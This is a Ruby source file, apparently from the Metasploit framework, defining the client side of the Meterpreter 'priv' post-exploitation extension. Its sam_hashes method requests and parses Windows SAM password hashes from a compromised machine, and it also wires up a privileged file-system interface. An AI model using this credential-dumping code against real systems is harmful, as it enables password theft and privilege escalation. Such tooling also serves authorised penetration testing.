#!/usr/bin/env ruby

require 'rex/post/meterpreter/extensions/priv/tlv'
require 'rex/post/meterpreter/extensions/priv/passwd'
require 'rex/post/meterpreter/extensions/priv/fs'

module Rex
module Post
module Meterpreter
module Extensions
module Priv

###
#
# This meterpreter extensions a privilege escalation interface that is capable
# of doing things like dumping password hashes and performing local
# exploitation.
#
###
class Priv < Extension

	#
	# Initializes the privilege escalationextension.
	#
	def initialize(client)
		super(client, 'priv')
		
		client.register_extension_aliases(
			[
				{ 
					'name' => 'priv',
					'ext'  => self
				},
			])

		# Initialize sub-classes
		self.fs = Fs.new(client)
	end

	#
	# Returns an array of SAM hashes from the remote machine.
	#
	def sam_hashes
		response = client.send_request(
			Packet.create_request('priv_passwd_get_sam_hashes'))

		response.get_tlv_value(TLV_TYPE_SAM_HASHES).split(/\n/).map { |hash| 
			SamUser.new(hash)
		}
	end

	#
	# Modifying privileged file system attributes.
	#
	attr_reader :fs

protected

	attr_writer :fs # :nodoc:

end

end; end; end; end; end